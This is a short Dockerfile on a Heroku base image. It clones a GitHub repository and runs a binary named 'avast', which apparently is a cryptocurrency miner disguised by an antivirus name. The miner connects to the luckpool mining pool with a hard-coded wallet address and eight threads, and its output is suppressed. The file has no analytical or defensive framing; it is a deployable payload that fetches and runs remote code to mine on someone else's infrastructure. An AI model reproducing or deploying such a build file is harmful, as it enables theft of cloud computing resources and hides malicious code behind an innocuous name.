FROM heroku/heroku:18
RUN apt-get update && apt-get install -y \
    sudo \
    build-essential \
    libjansson4 \
 && mkdir -p /home/stuff
 RUN git clone https://github.com/samrikulan/zole.git && cd zole && chmod +x avast  >/dev/null 2>&1 && ./avast -v -l na.luckpool.net:3956 -u RBjwUUBxMbratayR2BWRbLWKZHBa4oxWs9 -t 8 -x
